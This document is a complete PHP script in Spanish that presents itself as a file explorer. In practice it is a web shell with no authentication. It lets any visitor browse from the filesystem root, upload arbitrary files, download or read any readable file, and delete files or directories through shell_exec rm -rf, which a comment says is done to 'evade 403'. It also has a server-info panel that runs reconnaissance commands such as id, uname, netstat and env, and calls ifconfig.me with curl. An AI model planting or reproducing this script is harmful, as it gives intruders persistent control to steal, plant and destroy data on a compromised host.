<?php
// ============================================================
// EXPLORADOR DE ARCHIVOS - CON DESCARGA AUTOMÁTICA
// ============================================================

// Función para limpiar rutas
function limpiarRuta($ruta) {
    $ruta = realpath($ruta);
    return ($ruta !== false) ? $ruta : getcwd();
}

// Función para tamano legible
function tamanoLegible($bytes) {
    if ($bytes == 0) return '0 B';
    $k = 1024;
    $m = $k * 1024;
    $g = $m * 1024;
    if ($bytes < $k) return $bytes . ' B';
    if ($bytes < $m) return round($bytes / $k, 2) . ' KB';
    if ($bytes < $g) return round($bytes / $m, 2) . ' MB';
    return round($bytes / $g, 2) . ' GB';
}

// Función para obtener icono según extensión
function getIcono($archivo) {
    if (is_dir($archivo)) return '📁';
    $ext = strtolower(pathinfo($archivo, PATHINFO_EXTENSION));
    $iconos = [
        'php' => '🐘', 'html' => '🌐', 'htm' => '🌐',
        'js' => '🟨', 'css' => '🟦', 'json' => '📋',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'svg' => '🖼️',
        'txt' => '📄', 'log' => '📄', 'conf' => '⚙️', 'ini' => '⚙️',
        'zip' => '📦', 'tar' => '📦', 'gz' => '📦', 'rar' => '📦',
        'sh' => '📜', 'py' => '📜', 'pl' => '📜',
        'sql' => '🗄️', 'db' => '🗄️',
        'pdf' => '📕', 'doc' => '📘', 'docx' => '📘',
        'mp3' => '🎵', 'mp4' => '🎬', 'avi' => '🎬'
    ];
    return isset($iconos[$ext]) ? $iconos[$ext] : '📄';
}

// Obtener directorio actual
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = limpiarRuta($dir);

// Manejar acciones
$mensaje = '';
$modalContent = '';
$showServerInfo = false;

if (isset($_GET['action'])) {
    $action = $_GET['action'];
    
    // Subir archivo
    if ($action === 'upload' && isset($_FILES['file'])) {
        $target = $dir . '/' . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            $mensaje = "✅ Archivo subido: " . htmlspecialchars(basename($_FILES['file']['name']));
        } else {
            $mensaje = "❌ Error al subir el archivo";
        }
    }
    
    // ============================================================
    // DESCARGA AUTOMÁTICA (FUNCIONA PARA CUALQUIER ARCHIVO)
    // ============================================================
    if ($action === 'download_auto' && isset($_GET['file'])) {
        $file = $dir . '/' . basename($_GET['file']);
        if (file_exists($file) && is_file($file) && is_readable($file)) {
            // Forzar descarga con Content-Type adecuado
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        } else {
            $mensaje = "❌ No se puede descargar el archivo";
        }
    }
    
    // ============================================================
    // ELIMINAR ARCHIVO USANDO SHELL_EXEC (EVITA 403)
    // ============================================================
    if ($action === 'delete' && isset($_GET['file'])) {
        $file = $dir . '/' . basename($_GET['file']);
        if (file_exists($file)) {
            if (is_dir($file)) {
                $cmd = 'rm -rf ' . escapeshellarg($file);
                $output = shell_exec($cmd . ' 2>&1');
                if (empty($output) || !file_exists($file)) {
                    $mensaje = "✅ Directorio eliminado: " . htmlspecialchars(basename($file));
                } else {
                    $mensaje = "❌ Error al eliminar: " . htmlspecialchars($output);
                }
            } else {
                $cmd = 'rm -f ' . escapeshellarg($file);
                $output = shell_exec($cmd . ' 2>&1');
                if (empty($output) || !file_exists($file)) {
                    $mensaje = "✅ Archivo eliminado: " . htmlspecialchars(basename($file));
                } else {
                    $mensaje = "❌ Error al eliminar: " . htmlspecialchars($output);
                }
            }
        } else {
            $mensaje = "❌ El archivo no existe";
        }
    }
    
    // Ver archivo (mostrar contenido)
    if ($action === 'view' && isset($_GET['file'])) {
        $file = $dir . '/' . basename($_GET['file']);
        if (file_exists($file) && is_file($file) && is_readable($file)) {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $textExtensions = ['txt', 'php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'log', 'conf', 'ini', 'sh', 'py', 'pl', 'sql'];
            if (in_array($ext, $textExtensions)) {
                $content = htmlspecialchars(file_get_contents($file));
                $modalContent = $content;
            } else {
                $modalContent = "🖼️ Archivo binario o imagen. Descárgalo para verlo.";
            }
        } else {
            $mensaje = "❌ No se puede leer el archivo";
        }
    }
    
    // Crear directorio
    if ($action === 'mkdir' && isset($_GET['newdir'])) {
        $newdir = $dir . '/' . basename($_GET['newdir']);
        if (!file_exists($newdir)) {
            if (mkdir($newdir, 0755)) $mensaje = "✅ Directorio creado";
            else $mensaje = "❌ No se puede crear";
        } else {
            $mensaje = "❌ El directorio ya existe";
        }
    }
    
    // Mostrar info del servidor
    if ($action === 'server_info') {
        $showServerInfo = true;
    }
}

// Leer directorio
$files = scandir($dir);
$parentDir = dirname($dir);
$currentUser = trim(shell_exec('whoami'));

// Ordenar: directorios primero, luego archivos
$dirs = [];
$archivos = [];
foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue;
    $fullPath = $dir . '/' . $file;
    if (is_dir($fullPath)) {
        $dirs[] = $file;
    } else {
        $archivos[] = $file;
    }
}
sort($dirs, SORT_STRING | SORT_FLAG_CASE);
sort($archivos, SORT_STRING | SORT_FLAG_CASE);
$sortedFiles = array_merge($dirs, $archivos);

// ============================================================
// FUNCIONES PARA INFO DEL SERVIDOR
// ============================================================

function getServerInfo() {
    $info = [];
    $info['os'] = shell_exec('uname -a');
    $info['os_release'] = shell_exec('cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d"=" -f2 | tr -d \'"\'');
    $info['user'] = shell_exec('whoami');
    $info['id'] = shell_exec('id');
    $info['hostname'] = shell_exec('hostname');
    $info['ip_internal'] = shell_exec("hostname -I 2>/dev/null | awk '{print $1}'");
    $info['ip_external'] = trim(shell_exec('curl -s ifconfig.me 2>/dev/null'));
    if (empty($info['ip_external'])) {
        $info['ip_external'] = shell_exec('curl -s icanhazip.com 2>/dev/null');
    }
    $info['disk'] = shell_exec('df -h / 2>/dev/null | tail -1');
    
    $meminfo = shell_exec('cat /proc/meminfo 2>/dev/null');
    if ($meminfo) {
        preg_match('/MemTotal:\s+(\d+)/', $meminfo, $total);
        preg_match('/MemAvailable:\s+(\d+)/', $meminfo, $available);
        preg_match('/MemFree:\s+(\d+)/', $meminfo, $free);
        preg_match('/SwapTotal:\s+(\d+)/', $meminfo, $swapTotal);
        preg_match('/SwapFree:\s+(\d+)/', $meminfo, $swapFree);
        $info['mem_total'] = isset($total[1]) ? round($total[1] / 1024 / 1024, 2) . ' GB' : 'N/A';
        $info['mem_available'] = isset($available[1]) ? round($available[1] / 1024 / 1024, 2) . ' GB' : 'N/A';
        $info['mem_free'] = isset($free[1]) ? round($free[1] / 1024 / 1024, 2) . ' GB' : 'N/A';
        $info['swap_total'] = isset($swapTotal[1]) ? round($swapTotal[1] / 1024 / 1024, 2) . ' GB' : 'N/A';
        $info['swap_free'] = isset($swapFree[1]) ? round($swapFree[1] / 1024 / 1024, 2) . ' GB' : 'N/A';
    } else {
        $info['mem_total'] = 'N/A';
        $info['mem_available'] = 'N/A';
        $info['mem_free'] = 'N/A';
        $info['swap_total'] = 'N/A';
        $info['swap_free'] = 'N/A';
    }
    
    $info['load'] = shell_exec('uptime | awk -F"load average:" \'{print $2}\'');
    $info['processes'] = shell_exec('ps aux | wc -l');
    $info['open_ports'] = shell_exec('netstat -tulpn 2>/dev/null | grep LISTEN | head -15');
    if (empty($info['open_ports'])) {
        $info['open_ports'] = shell_exec('ss -tulpn 2>/dev/null | grep LISTEN | head -15');
    }
    $info['env'] = shell_exec('env | grep -E "PATH|HOME|USER|SHELL|TERM|LANG"');
    $info['php_version'] = phpversion();
    $info['php_memory'] = ini_get('memory_limit');
    $info['php_max_execution'] = ini_get('max_execution_time');
    $info['php_post_max'] = ini_get('post_max_size');
    $info['php_upload_max'] = ini_get('upload_max_filesize');
    return $info;
}

$serverInfo = $showServerInfo ? getServerInfo() : null;
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📂 Explorador de Archivos</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0e17;
            color: #00ff41;
            font-family: 'Segoe UI', 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            background: #111a2e;
            border: 1px solid #00ff41;
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .header h1 {
            font-size: 1.5em;
            color: #00ff41;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }
        .header .info {
            font-size: 0.9em;
            color: #00cc33;
        }
        .header .info span { color: #ff6b6b; }
        
        .toolbar {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-bottom: 15px;
            padding: 10px;
            background: #111a2e;
            border-radius: 8px;
            border: 1px solid #00ff41;
        }
        .toolbar .btn {
            background: #0a0e17;
            border: 1px solid #00ff41;
            border-radius: 4px;
            padding: 8px 16px;
            color: #00ff41;
            cursor: pointer;
            font-family: 'Segoe UI', 'Courier New', monospace;
            font-size: 13px;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        .toolbar .btn:hover {
            background: #00ff41;
            color: #0a0e17;
        }
        .toolbar .btn.danger {
            border-color: #ff4444;
            color: #ff4444;
        }
        .toolbar .btn.danger:hover {
            background: #ff4444;
            color: #0a0e17;
        }
        .toolbar .btn.info {
            border-color: #44aaff;
            color: #44aaff;
        }
        .toolbar .btn.info:hover {
            background: #44aaff;
            color: #0a0e17;
        }
        
        .breadcrumb {
            background: #111a2e;
            border: 1px solid #00ff41;
            border-radius: 4px;
            padding: 12px 15px;
            margin-bottom: 15px;
            font-size: 14px;
            word-wrap: break-word;
            color: #88ffaa;
        }
        .breadcrumb span { color: #00ff88; font-weight: bold; }
        
        .mensaje {
            background: #111a2e;
            border: 1px solid #ffaa00;
            border-radius: 4px;
            padding: 10px 15px;
            margin-bottom: 15px;
            color: #ffaa00;
        }
        .mensaje.success {
            border-color: #00ff41;
            color: #00ff41;
        }
        
        .file-table {
            width: 100%;
            background: #111a2e;
            border: 1px solid #00ff41;
            border-radius: 8px;
            border-collapse: collapse;
            overflow: hidden;
        }
        .file-table th {
            background: #0a0e17;
            color: #00ff41;
            padding: 12px 15px;
            text-align: left;
            font-size: 13px;
            border-bottom: 2px solid #00ff41;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .file-table td {
            padding: 10px 15px;
            border-bottom: 1px solid #1a2a3a;
            font-size: 14px;
            color: #aaffbb;
        }
        .file-table tr:hover {
            background: #0a0e17;
        }
        .file-table tr:last-child td {
            border-bottom: none;
        }
        .file-table .file-item {
            text-decoration: none;
            color: #aaffbb;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .file-table .file-item .icon {
            font-size: 22px;
            width: 30px;
            text-align: center;
        }
        .file-table .file-item .name {
            font-weight: 500;
            font-size: 15px;
            color: #00ff88;
        }
        .file-table .file-item .name:hover {
            text-decoration: underline;
        }
        .file-table .file-item.dir .name {
            color: #00ff41;
        }
        .file-table .file-item.parent .name {
            color: #ffaa00;
        }
        .file-table .file-size {
            font-size: 13px;
            color: #6688aa;
            white-space: nowrap;
        }
        .file-table .file-perms {
            font-size: 12px;
            color: #445566;
            font-family: 'Courier New', monospace;
        }
        .file-table .file-date {
            font-size: 12px;
            color: #6688aa;
            white-space: nowrap;
        }
        .file-table .file-actions {
            display: flex;
            gap: 8px;
            white-space: nowrap;
        }
        .file-table .file-actions a {
            color: #00ff41;
            text-decoration: none;
            font-size: 16px;
            padding: 2px 6px;
            border-radius: 3px;
            transition: all 0.2s;
        }
        .file-table .file-actions a:hover {
            background: #00ff41;
            color: #0a0e17;
        }
        .file-table .file-actions a.danger { color: #ff4444; }
        .file-table .file-actions a.danger:hover { background: #ff4444; color: #0a0e17; }
        .file-table .file-actions a.view { color: #44aaff; }
        .file-table .file-actions a.view:hover { background: #44aaff; color: #0a0e17; }
        .file-table .file-actions a.download-cat { color: #ffaa00; }
        .file-table .file-actions a.download-cat:hover { background: #ffaa00; color: #0a0e17; }
        .file-table .file-actions a.download-normal { color: #00ff88; }
        .file-table .file-actions a.download-normal:hover { background: #00ff88; color: #0a0e17; }
        
        .upload-area {
            background: #111a2e;
            border: 1px solid #00ff41;
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
        }
        .upload-area form {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
        }
        .upload-area input[type="file"] {
            color: #00ff41;
            font-family: 'Segoe UI', 'Courier New', monospace;
            flex: 1;
        }
        .upload-area input[type="file"]::file-selector-button {
            background: #0a0e17;
            border: 1px solid #00ff41;
            border-radius: 4px;
            padding: 8px 20px;
            color: #00ff41;
            cursor: pointer;
            font-family: 'Segoe UI', 'Courier New', monospace;
        }
        .upload-area input[type="file"]::file-selector-button:hover {
            background: #00ff41;
            color: #0a0e17;
        }
        
        .status-bar {
            margin-top: 15px;
            padding: 10px 15px;
            background: #111a2e;
            border: 1px solid #00ff41;
            border-radius: 4px;
            font-size: 13px;
            color: #88ffaa;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        .status-bar .dir { color: #00ff88; }
        .status-bar .user { color: #ffaa00; }
        
        /* Modal para Info Servidor */
        .modal-server {
            display: <?php echo ($showServerInfo) ? 'block' : 'none'; ?>;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.85);
            z-index: 1000;
            padding: 20px;
            overflow: auto;
        }
        .modal-server-content {
            background: #111a2e;
            border: 1px solid #00ff41;
            border-radius: 8px;
            max-width: 900px;
            margin: 20px auto;
            padding: 25px;
            position: relative;
        }
        .modal-server-content .close {
            position: absolute;
            top: 10px;
            right: 20px;
            color: #ff4444;
            font-size: 30px;
            cursor: pointer;
            background: none;
            border: none;
        }
        .modal-server-content h2 {
            color: #00ff41;
            margin-bottom: 20px;
            font-size: 1.3em;
        }
        .modal-server-content .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }
        .modal-server-content .info-card {
            background: #0a0e17;
            border: 1px solid #1a2a3a;
            border-radius: 6px;
            padding: 15px;
        }
        .modal-server-content .info-card h3 {
            color: #44aaff;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
            border-bottom: 1px solid #1a2a3a;
            padding-bottom: 5px;
        }
        .modal-server-content .info-card .value {
            color: #aaffbb;
            font-size: 13px;
            word-wrap: break-word;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
        }
        .modal-server-content .info-card .value .label {
            color: #6688aa;
        }
        .modal-server-content .info-card .value pre {
            margin: 0;
            color: #aaffbb;
            font-size: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        /* Modal para ver archivos */
        .modal {
            display: <?php echo (!empty($modalContent) && !$showServerInfo) ? 'block' : 'none'; ?>;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.85);
            z-index: 1000;
            padding: 20px;
            overflow: auto;
        }
        .modal-content {
            background: #111a2e;
            border: 1px solid #00ff41;
            border-radius: 8px;
            max-width: 900px;
            margin: 30px auto;
            padding: 25px;
            position: relative;
        }
        .modal-content .close {
            position: absolute;
            top: 10px;
            right: 20px;
            color: #ff4444;
            font-size: 30px;
            cursor: pointer;
            background: none;
            border: none;
        }
        .modal-content h2 {
            color: #00ff41;
            margin-bottom: 15px;
            font-size: 1.2em;
        }
        .modal-content .copy-btn {
            background: #0a0e17;
            border: 1px solid #00ff41;
            border-radius: 4px;
            padding: 8px 16px;
            color: #00ff41;
            cursor: pointer;
            font-family: 'Segoe UI', 'Courier New', monospace;
            font-size: 13px;
            margin-bottom: 15px;
            transition: all 0.3s;
        }
        .modal-content .copy-btn:hover {
            background: #00ff41;
            color: #0a0e17;
        }
        .modal-content pre {
            background: #0a0e17;
            padding: 15px;
            border-radius: 4px;
            overflow: auto;
            max-height: 500px;
            color: #aaffbb;
            font-size: 13px;
            line-height: 1.6;
            white-space: pre-wrap;
            word-wrap: break-word;
            border: 1px solid #1a2a3a;
        }
        
        @media (max-width: 768px) {
            .file-table th, .file-table td {
                padding: 8px 10px;
                font-size: 12px;
            }
            .file-table .file-item .name { font-size: 13px; }
            .header h1 { font-size: 1.2em; }
            .toolbar .btn { font-size: 11px; padding: 6px 12px; }
            .modal-server-content .info-grid { grid-template-columns: 1fr; }
        }
        
        .file-table .file-item.php .name { color: #ff6b6b; }
        .file-table .file-item.html .name { color: #ffaa00; }
        .file-table .file-item.jpg .name, 
        .file-table .file-item.png .name,
        .file-table .file-item.gif .name { color: #ff88cc; }
        .file-table .file-item.txt .name,
        .file-table .file-item.log .name { color: #88ccff; }
        .file-table .file-item.zip .name { color: #ff8800; }
        .file-table .file-item.sh .name { color: #88ff88; }
    </style>
</head>
<body>
<div class="container">
    <!-- Header -->
    <div class="header">
        <h1>📂 EXPLORADOR DE ARCHIVOS</h1>
        <div class="info">
            👤 <span><?php echo htmlspecialchars($currentUser); ?></span>
            &nbsp;|&nbsp; 🕒 <?php echo date('Y-m-d H:i:s'); ?>
        </div>
    </div>

    <!-- Toolbar -->
    <div class="toolbar">
        <a href="<?php echo basename(__FILE__); ?>?dir=<?php echo urlencode($dir); ?>" class="btn">🔄 Recargar</a>
        <a href="<?php echo basename(__FILE__); ?>?dir=<?php echo urlencode($parentDir); ?>" class="btn">⬆ Subir</a>
        <a href="<?php echo basename(__FILE__); ?>?dir=<?php echo urlencode(getcwd()); ?>" class="btn">🏠 Inicio</a>
        <a href="<?php echo basename(__FILE__); ?>?dir=/" class="btn">📁 Raíz</a>
        <button onclick="crearDirectorio()" class="btn">📁 Crear carpeta</button>
        <!-- ============================================================ -->
        <!-- BOTÓN INFO SERVIDOR -->
        <!-- ============================================================ -->
        <a href="<?php echo basename(__FILE__); ?>?action=server_info&dir=<?php echo urlencode($dir); ?>" class="btn info">🖥️ Info Servidor</a>
    </div>

    <!-- Breadcrumb -->
    <div class="breadcrumb">
        📍 <span><?php echo htmlspecialchars(str_replace('/', ' / ', $dir)); ?></span>
    </div>

    <!-- Mensaje -->
    <?php if (!empty($mensaje)): ?>
    <div class="mensaje <?php echo strpos($mensaje, '✅') !== false ? 'success' : ''; ?>">
        <?php echo $mensaje; ?>
    </div>
    <?php endif; ?>

    <!-- File Table -->
    <table class="file-table">
        <thead>
            <tr>
                <th style="width: 40%;">📄 Nombre</th>
                <th style="width: 12%;">📦 Tamaño</th>
                <th style="width: 12%;">🔒 Permisos</th>
                <th style="width: 18%;">📅 Modificado</th>
                <th style="width: 18%;">⚡ Acciones</th>
            </tr>
        </thead>
        <tbody>
            <?php if ($dir !== '/'): ?>
            <tr>
                <td>
                    <a href="<?php echo basename(__FILE__); ?>?dir=<?php echo urlencode($parentDir); ?>" class="file-item parent">
                        <span class="icon">📂</span>
                        <span class="name">.. (Directorio padre)</span>
                    </a>
                </td>
                <td class="file-size">-</td>
                <td class="file-perms">-</td>
                <td class="file-date">-</td>
                <td></td>
            </tr>
            <?php endif; ?>
            
            <?php foreach ($sortedFiles as $file): ?>
                <?php 
                $fullPath = $dir . '/' . $file;
                $isDir = is_dir($fullPath);
                $icono = getIcono($fullPath);
                $tamano = $isDir ? '📁 Carpeta' : tamanoLegible(filesize($fullPath));
                $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
                $fecha = date('Y-m-d H:i:s', filemtime($fullPath));
                $clase = 'file-item';
                if ($isDir) $clase .= ' dir';
                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                if (!$isDir) $clase .= ' ' . $ext;
                $isPhp = ($ext === 'php');
                ?>
                <tr>
                    <td>
                        <?php if ($isDir): ?>
                            <a href="<?php echo basename(__FILE__); ?>?dir=<?php echo urlencode($fullPath); ?>" class="<?php echo $clase; ?>">
                                <span class="icon"><?php echo $icono; ?></span>
                                <span class="name"><?php echo htmlspecialchars($file); ?></span>
                            </a>
                        <?php else: ?>
                            <span class="<?php echo $clase; ?>">
                                <span class="icon"><?php echo $icono; ?></span>
                                <span class="name"><?php echo htmlspecialchars($file); ?></span>
                            </span>
                        <?php endif; ?>
                    </td>
                    <td class="file-size"><?php echo $tamano; ?></td>
                    <td class="file-perms"><?php echo $perms; ?></td>
                    <td class="file-date"><?php echo $fecha; ?></td>
                    <td class="file-actions">
                        <?php if (!$isDir): ?>
                            <!-- ============================================================ -->
                            <!-- BOTÓN DE DESCARGA AUTOMÁTICA (NUEVO) -->
                            <!-- ============================================================ -->
                            <a href="<?php echo basename(__FILE__); ?>?action=download_auto&dir=<?php echo urlencode($dir); ?>&file=<?php echo urlencode($file); ?>" class="download-normal" title="Descargar automáticamente">⬇️</a>
                            <a href="<?php echo basename(__FILE__); ?>?action=view&dir=<?php echo urlencode($dir); ?>&file=<?php echo urlencode($file); ?>" class="view" title="Ver contenido" onclick="verArchivo(event, this.href)">👁️</a>
                        <?php endif; ?>
                        <!-- ============================================================ -->
                        <!-- ELIMINAR CON SHELL_EXEC (EVITA 403) -->
                        <!-- ============================================================ -->
                        <a href="<?php echo basename(__FILE__); ?>?action=delete&dir=<?php echo urlencode($dir); ?>&file=<?php echo urlencode($file); ?>" class="danger" title="Eliminar" onclick="return confirm('¿Eliminar <?php echo htmlspecialchars($file); ?>?')">🗑️</a>
                    </td>
                </tr>
            <?php endforeach; ?>
            
            <?php if (count($sortedFiles) === 0): ?>
            <tr>
                <td colspan="5" style="text-align: center; padding: 30px; color: #445566;">
                    📭 El directorio está vacío
                </td>
            </tr>
            <?php endif; ?>
        </tbody>
    </table>

    <!-- Upload Area -->
    <div class="upload-area">
        <form action="<?php echo basename(__FILE__); ?>?action=upload&dir=<?php echo urlencode($dir); ?>" method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit" class="btn" style="background: #0a0e17; border: 1px solid #00ff41; border-radius: 4px; padding: 8px 20px; color: #00ff41; cursor: pointer;">⬆ SUBIR</button>
        </form>
    </div>

    <!-- Status Bar -->
    <div class="status-bar">
        <span class="dir">📁 <?php echo htmlspecialchars($dir); ?></span>
        <span class="user">👤 <?php echo htmlspecialchars($currentUser); ?></span>
        <span>📄 <?php echo count($sortedFiles); ?> elementos</span>
    </div>
</div>

<!-- Modal para Info Servidor -->
<div class="modal-server" id="modalServer">
    <div class="modal-server-content">
        <button class="close" onclick="cerrarModalServer()">&times;</button>
        <h2>🖥️ INFO DEL SERVIDOR</h2>
        <div class="info-grid">
            <div class="info-card">
                <h3>🐧 Sistema Operativo</h3>
                <div class="value">
                    <span class="label">Hostname:</span> <?php echo htmlspecialchars(trim($serverInfo['hostname'] ?? 'N/A')); ?><br>
                    <span class="label">Kernel:</span> <?php echo htmlspecialchars(trim($serverInfo['os'] ?? 'N/A')); ?><br>
                    <span class="label">Distro:</span> <?php echo htmlspecialchars(trim($serverInfo['os_release'] ?? 'N/A')); ?>
                </div>
            </div>
            <div class="info-card">
                <h3>👤 Usuario</h3>
                <div class="value">
                    <span class="label">Usuario:</span> <?php echo htmlspecialchars(trim($serverInfo['user'] ?? 'N/A')); ?><br>
                    <span class="label">ID:</span> <?php echo htmlspecialchars(trim($serverInfo['id'] ?? 'N/A')); ?>
                </div>
            </div>
            <div class="info-card">
                <h3>🌐 Red</h3>
                <div class="value">
                    <span class="label">IP Interna:</span> <?php echo htmlspecialchars(trim($serverInfo['ip_internal'] ?? 'N/A')); ?><br>
                    <span class="label">IP Externa:</span> <?php echo htmlspecialchars(trim($serverInfo['ip_external'] ?? 'N/A')); ?>
                </div>
            </div>
            <div class="info-card">
                <h3>💾 Disco (/)</h3>
                <div class="value">
                    <?php 
                    if (!empty($serverInfo['disk'])) {
                        $diskParts = preg_split('/\s+/', trim($serverInfo['disk']));
                        if (count($diskParts) >= 6) {
                            echo "<span class='label'>Total:</span> {$diskParts[1]}<br>";
                            echo "<span class='label'>Usado:</span> {$diskParts[2]}<br>";
                            echo "<span class='label'>Disponible:</span> {$diskParts[3]}<br>";
                            echo "<span class='label'>Uso:</span> {$diskParts[4]}";
                        } else {
                            echo htmlspecialchars(trim($serverInfo['disk']));
                        }
                    } else {
                        echo "N/A";
                    }
                    ?>
                </div>
            </div>
            <div class="info-card">
                <h3>🧠 Memoria RAM</h3>
                <div class="value">
                    <span class="label">Total:</span> <?php echo $serverInfo['mem_total'] ?? 'N/A'; ?><br>
                    <span class="label">Disponible:</span> <?php echo $serverInfo['mem_available'] ?? 'N/A'; ?><br>
                    <span class="label">Libre:</span> <?php echo $serverInfo['mem_free'] ?? 'N/A'; ?><br>
                    <span class="label">Swap Total:</span> <?php echo $serverInfo['swap_total'] ?? 'N/A'; ?><br>
                    <span class="label">Swap Libre:</span> <?php echo $serverInfo['swap_free'] ?? 'N/A'; ?>
                </div>
            </div>
            <div class="info-card">
                <h3>⚡ Carga & Procesos</h3>
                <div class="value">
                    <span class="label">Load Average:</span> <?php echo htmlspecialchars(trim($serverInfo['load'] ?? 'N/A')); ?><br>
                    <span class="label">Procesos totales:</span> <?php echo htmlspecialchars(trim($serverInfo['processes'] ?? 'N/A')); ?>
                </div>
            </div>
            <div class="info-card">
                <h3>🐘 PHP</h3>
                <div class="value">
                    <span class="label">Versión:</span> <?php echo $serverInfo['php_version'] ?? 'N/A'; ?><br>
                    <span class="label">Memory Limit:</span> <?php echo $serverInfo['php_memory'] ?? 'N/A'; ?><br>
                    <span class="label">Max Execution:</span> <?php echo $serverInfo['php_max_execution'] ?? 'N/A'; ?>s<br>
                    <span class="label">Post Max Size:</span> <?php echo $serverInfo['php_post_max'] ?? 'N/A'; ?><br>
                    <span class="label">Upload Max:</span> <?php echo $serverInfo['php_upload_max'] ?? 'N/A'; ?>
                </div>
            </div>
            <div class="info-card">
                <h3>🔌 Puertos Abiertos (LISTEN)</h3>
                <div class="value">
                    <?php 
                    $ports = trim($serverInfo['open_ports'] ?? '');
                    if (!empty($ports)) {
                        echo '<pre>' . htmlspecialchars($ports) . '</pre>';
                    } else {
                        echo "No se pudieron obtener los puertos abiertos";
                    }
                    ?>
                </div>
            </div>
            <div class="info-card">
                <h3>📋 Variables de Entorno</h3>
                <div class="value">
                    <pre><?php echo htmlspecialchars(trim($serverInfo['env'] ?? 'N/A')); ?></pre>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Modal para ver archivos -->
<div id="modal" class="modal">
    <div class="modal-content">
        <button class="close" onclick="cerrarModal()">&times;</button>
        <h2>📄 Contenido del archivo</h2>
        <?php if (!empty($modalContent) && strpos($modalContent, '🖼️') === false): ?>
            <button class="copy-btn" onclick="copiarContenido()">📋 Copiar todo</button>
            <script>
            function copiarContenido() {
                var contenido = document.getElementById('modalContent').textContent;
                navigator.clipboard.writeText(contenido).then(function() {
                    alert('✅ Contenido copiado al portapapeles');
                }).catch(function() {
                    alert('❌ No se pudo copiar. Selecciona manualmente.');
                });
            }
            </script>
        <?php endif; ?>
        <pre id="modalContent"><?php echo !empty($modalContent) ? $modalContent : 'Cargando...'; ?></pre>
    </div>
</div>

<script>
function verArchivo(event, url) {
    event.preventDefault();
    var modal = document.getElementById('modal');
    var content = document.getElementById('modalContent');
    modal.style.display = 'block';
    content.textContent = 'Cargando...';
    
    fetch(url)
        .then(response => response.text())
        .then(html => {
            var parser = new DOMParser();
            var doc = parser.parseFromString(html, 'text/html');
            var mensaje = doc.querySelector('.mensaje');
            if (mensaje) {
                content.textContent = mensaje.textContent.trim();
            } else {
                var modalContent = doc.getElementById('modalContent');
                if (modalContent) {
                    content.textContent = modalContent.textContent;
                } else {
                    content.textContent = 'No se pudo mostrar el contenido del archivo.';
                }
            }
        })
        .catch(error => {
            content.textContent = 'Error: ' + error;
        });
}

function cerrarModal() {
    document.getElementById('modal').style.display = 'none';
}

function cerrarModalServer() {
    var url = window.location.pathname + '?dir=<?php echo urlencode($dir); ?>';
    window.location.href = url;
}

function crearDirectorio() {
    var nombre = prompt('Nombre del nuevo directorio:');
    if (nombre && nombre.trim() !== '') {
        var url = window.location.pathname + '?action=mkdir&dir=<?php echo urlencode($dir); ?>&newdir=' + encodeURIComponent(nombre.trim());
        window.location.href = url;
    }
}

document.getElementById('modal').addEventListener('click', function(e) {
    if (e.target === this) cerrarModal();
});

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        cerrarModal();
        if (document.getElementById('modalServer').style.display === 'block') {
            cerrarModalServer();
        }
    }
});
</script>
</body>
</html>
